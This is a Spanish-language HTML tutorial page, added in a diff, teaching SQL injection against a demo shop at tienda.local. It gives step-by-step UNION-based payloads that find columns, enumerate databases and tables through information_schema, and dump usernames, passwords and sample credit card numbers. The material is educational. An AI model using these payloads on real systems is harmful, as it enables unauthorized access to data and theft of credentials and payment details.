@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+    <head>
+  	<title>SQL Injection</title>
+    	<meta charset="utf-8">
+    	<link rel="icon" type="image/png" href="../../img/logo.png" />
+      	<link rel="stylesheet" href="../decoration/style.css"/>
+    </head>
+
+  	<body>
+
+      	<div class="cuerpo">
+        	<div class="contenido">
+		        <h1 align="center">SQL Injection</h1><br><br>
+
+		        <p><strong>SQL Injection</strong> es una vulnerabilidad que permite a un atacante modificar las consultas SQL que una aplicación realiza a su base de datos. Por lo general permite que un atacante visualice datos que normalmente no podría ver, como usuarios, contraseñas, tarjetas de crédito y un largo etc. En numerosos casos, el atacante además de visualizar información sensible, puede modificar o incluso eliminar los datos.</p><br>
+		        <p>Todo esto es posible debido a que multitud de aplicaciones web rescatan información de una base de datos mediante parámetros mal filtrados.</p><br>
+
+		        <p>Para llevar a cabo este tipo de inyección es muy común inyectar una comilla simple en los parámetros a recoger, con el objetivo de forzar un error de sintaxis SQL y provocar que la pagina devuelva algún tipo de error por pantalla. Para que esto ocurra la opción "display_errors" debe estar habilitada (/etc/php/X.X/apache2/php.ini).</p><br>
+		        
+		        <p>Dejando la url de esta manera:</p><br>
+
+		        <pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">'</font></code></pre><br>
+
+		        <p>Devolviéndonos un error similar a este:</p><br>
+
+		        <pre rel="contenido"><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1</code></pre><br>
+
+		        <p>Puesto que todos los servidores no tienen habilitada la opción de "dispaly_errors", otra forma de comprobar si la web es vulnerable a SQL Injection es mediante una comparación matemática.</p><br>
+
+		        <pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' and 1=2</font></code></pre><br>
+
+		        <p>De esta manera como inyectamos en la consulta el operador lógico AND forzamos otra condición a cumplir la cual devolverá FALSE y provocará que cambie, aunque sea mínimamente la estructura de la página. Cabe añadir que las consultas no siempre están implementadas de la misma manera, y el atacante deberá probar todo tipo de inyecciones, por ejemplo <strong> and 1=2</strong> o <strong>' and 1='2</strong> en lugar de <strong>' and 1=2</strong></p><br>
+
+		        <p>Una buena herramienta para identificar cambios producidos en el sitio web tras aplicar estas inyecciones es el comparer de Burp Suite.</p><br>
+
+		        
+		        <p>Una vez aprendido a verificar si un sitio es vulnerable a una <strong>inyección basada en error</strong> lo primero que hará el atacante será intentar visualizar información sensible. Para ello realizará lo que se conoce como un ataque UNION. El cual permitirá extraer datos de una tabla diferente de la base de datos, pero para que funcione, la consulta union debe arrojar las mismas columnas que la sentencia a la que se inyecta, además del mismo tipo de datos, por lo que primordialmente, el atacante debe conocer cuantas columnas tiene la sentencia que esta intentando manipular. Para averiguar las columnas se suele hacer de dos formas, la más común es mediante <strong>order by</strong>.</p><br>
+		        
+		        <pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' order by 3-- -</font></code></pre><br>
+		        
+		        <p>Aquí en resumidas cuentas estamos diciendo que nos ordene por la columna 3 y comentamos todo lo que viene detrás (En mysql los comentarios son "-- ", es decir, dos guiones seguidos de un espacio obligatorio, mientras que en Oracle, Microsoft y PostgresSQL son "--", sin espacio, por lo que si no sabemos el tipo de base de datos con el que estamos tratando lo más acertado es añadir siempre un espacio detrás de los guiones). De esta forma si nos muestra un error quiere decir que hay menos de 3 columnas, en el caso de que no muestre un error o no cambie la estética de la página seguiremos aumentando el número. Hasta que demos con un número superior al número existentes de columnas de esa tabla, en mi caso, con el número 6 aparece este error por pantalla (No siempre aparece un error por pantalla, también puede darse el caso de que se modifique la estructura de la página).</p><br>
+
+		        <pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' order by 6-- -</font></code></pre><br>
+
+		        <p>Obtenemos este resultado:</p><br>
+
+		        <pre rel="contenido"><code>Unknown column '6' in 'order clause'</code></pre><br>
+
+		        <p>De esta forma un atacante puede determinar que efectivamente hay 5 columnas.</p><br>
+				
+				<p>La otra forma de llevar a cabo esta tarea es mediante la cláusula UNION. La cuál como hemos explicado antes arrojará un error siempre y cuando no saque el mismo número de columnas que la tabla a la que se une, permitiendo así identificar el número de columnas que hace uso la consulta que se tramita, además el tipo de datos de la consulta origen y la que inyectamos tienen que ser iguales.</p><br>		        
+		        
+		        <pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select null-- -</font></code></pre><br>
+
+		        <p>Obteniendo el siguiente resultado:</p><br>
+
+				<pre rel="contenido"><code>Could not run query: The used SELECT statements have a different number of columns</code></pre><br>
+
+		        <p>El ataque consistirá en seguir añadiendo null hasta que se quite ese error</p><br>
+				
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select null,null,null,null,null-- -</font></code></pre><br>
+
+				<p>De esta forma determinaremos que solo hay 5 columnas ya que al quinto valor null nos ha arrojado una vista perfecta de la página web.</p><br>
+
+				<stong>¿Porque inyectamos nulls como valores a la consulta inyectada?</stong><br>
+
+				<p>Como hemos dicho es mejor utilizar <strong>order by</strong> debido a que UNION, además de tener que tener en cuenta las columnas, también debemos tener en cuenta el que el tipo de datos de las columnas de la consulta original y la de la inyectada deben de ser iguales. Por eso se usan valores nulls porque estos son convertibles a cualquier tipo de dato de uso común. Pero no siempre tendremos éxito listando las columnas de esta manera.</p><br>
+				
+				<p>Ahora que ya conocemos las columnas, tendremos que usar la cláusula UNION para extraer información sensible de cualquier otra tabla, para ello tendremos en cuenta las restricciones comentadas anteriormente. <br> El primer paso sería lograr visualizar en la web las columnas de nuestra sentencia UNION, para ello debemos identificar los campos y determinar cuales de ellos son VARCHAR. Esto se consigue cambiando los valores nulls, por valores numéricos o varchars para ir determinando el tipo de cada uno de los campos. El  objetivo será identificar qué campo es de tipo VARCHAR, para aprovecharnos de él y poder imprimir strings, las cuáles contendrán el resultado de las consultas que inyectemos a la base de datos.</p><br>
+
+
+				<p>En este caso tendremos dos columnas visibles de las cuáles las dos son de tipo VARCHAR</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c','d','e'-- -</font></code></pre><br>
+
+				<p>Todas las columnas son de tipo VARCHAR, lo sabemos porque la página carga sin arrojar ningún fallo de SQL, también podemos apreciar que <stong>en la página se muestran dos carácteres imprimibles, la "c" y la "d"</stong>.</p><br>
+
+				<p>Lo primero que se suele obtener es el usuario de la base de datos, la versión y el nombre de la base de datos que está en uso.</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b',database(),user(),'e'-- -</font></code></pre><br>
+
+				<p>De esta manera al contar solo con dos columnas visibles desde la web, se nos limita la información que podremos sacar por pantalla a la vez, en nuestro caso, veríamos el nombre de la base de datos, y el usuario, pero no podremos visualizar la versión en la misma consulta. En bases de datos MySQL hay una manera de concatenar strings, en Oracle otra, en Microsoft otra distinta... Al final del documento dejaré unos enlaces por si se quiere profundizar en el Tema. El caso es que nosotros nos centraremos en MySQL y en este gestor de bases de datos la forma de concatenar strings seria con la función <strong>CONCAT()</strong>. De esta manera, en una columna imprimible, podremos sacar el número de valores que deseemos.</p><br>
+
+				<p>Para que la información no se muestre pegada, podemos utilizar caracteres en hexadecimal precedidos de <strong>0x</strong> para separar los resultados. Quedando de esta manera:</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b',CONCAT(database(),0x20,user(),0x20,version()),'d','e'-- -</font></code></pre><br>
+
+				<p>Donde <strong>20</strong> es un espacio convertido a hexadecimal (' ' => '0x20'). Mostrando así cada resultado separado por un espacio.</p><br>
+
+				<p>Una vez sepamos el nombre de la base de datos que se está usando ya podríamos empezar a extraer información, pero siempre es mejor listar todas las bases de datos por si hay alguna interesante. Para ello utilizaremos una base de datos que se encuentra en todos los gestores de bases de datos, el nombre es <strong>information_schema</strong>. Esta base de datos proporciona información como el nombre de otras bases de datos o tablas, el tipo de datos de una columna, permisos de acceso...</p><br>
+
+				<p>Nosotros nos aprovecharemos de esto para listar las bases de datos.</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',schema_name,'e' FROM information_schema.schemata-- -</font></code></pre><br>
+
+				<p>Devolviéndonos por pantalla las bases de datos existentes:</p><br>
+
+				<ul type="circle">
+					<li>information_schema</li>
+					<li>mi_tienda</li>
+				</ul>
+				<br>
+
+				<p>Puede darse el caso que las respuestas estén limitadas a un solo resultado. Si nos enfrentamos a este pequeño inconveniente podemos usar la cláusula limit, esta permite limitar los resultados que nos arroje la base de datos. Por ejemplo:</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',schema_name,'e' FROM information_schema.schemata LIMIT 0,1-- -</font></code></pre><br>
+
+				<p>De esta forma limitamos la respuesta por el primer resultado</p>
+
+				<br>
+				<ul type="circle">
+					<li>information_schema</li>
+				</ul>
+				<br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',schema_name,'e' FROM information_schema.schemata LIMIT 1,1-- -</font></code></pre><br>
+
+				<ul type="circle">
+					<li>mi_tienda</li>
+				</ul>
+				<br>
+
+				<p>De esta manera podemos ir filtrando para lograr ver todos los resultados.</p>
+
+				<p>Tras sacar el nombre de las bases de datos, procederemos a sacar las tablas.</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',table_name,'e' FROM information_schema.tables where table_schema=database()-- -</font></code></pre><br>
+
+				<p>Esto sería lo mismo que:</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',table_name,'e' FROM information_schema.tables where table_schema="mi_tienda"-- -</font></code></pre><br>
+
+				<p>Es lo mismo debido a que el resultado de la función database() devuelve mi_tienda.</p><br>
+
+				<p>El resultado de esta consulta nos dará las tablas existentes en la base de datos mi_tienda.</p><br>
+
+				<ul type="circle">
+					<li>productos</li>
+					<li>pedidos</li>
+					<li>usuarios</li>
+				</ul>
+				<br>
+
+				<p>Recordemos que si solo se nos muestra un resultado podemos utilizar la cláusula LIMIT</p><br>
+
+				<p>Vamos a estraer las columnas de la tabla usuarios.</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',column_name,'e' FROM information_schema.columns where table_name="usuarios"-- -</font></code></pre><br>
+
+				<p>Obteniendo los siguientes resultados:</p><br>
+
+				<ul type="circle">
+					<li>id</li>
+					<li>usuario</li>
+					<li>contraseña</li>
+					<li>tarjeta</li>
+				</ul>
+				<br>
+
+				<p>Son 3 los campos que nos interesan, el usuario, la contraseña y las tarjetas de crédito.<br>
+				Recordemos que solo tenemos dos columnas que muestran datos por pantalla, así que debemos concatenar strings.</p><br>
+
+				<pre rel="url" ><code>http://tienda.local/productos.php?id=71<font color="#FF5E00">' union select 'a','b','c',concat(usuario,0x20,contraseña,0x20,tarjeta),'e' FROM usuarios-- -</font></code></pre><br>
+
+				<p>Devolviéndonos los resultados separados por espacios:</p><br>
+
+				<ul type="circle">
+					<li>Juan P@$$w0rd! Card Number:5309296287632509 CVV:772 Expires:09/2023</li>
+					<li>Joselete19 VivaEspaña!! Card Number:4027861944248121 CVV:336 Expires:10/2024</li>
+				</ul>
+				<br>
+
+				<p>Para profundizar más sobre SQL injection aquí dejo un enlace:<br>
+					<a href="http://portswigger.net/web-security/sql-injection"><i><strong">https://portswigger.net/web-security/sql-injection</strong></i></a></p>
+        	</div>
+    	</div>
+    	<footer>
+      		<marquee>SQL Injection</marquee>
+    	</footer>
+  	</body>
+</html>
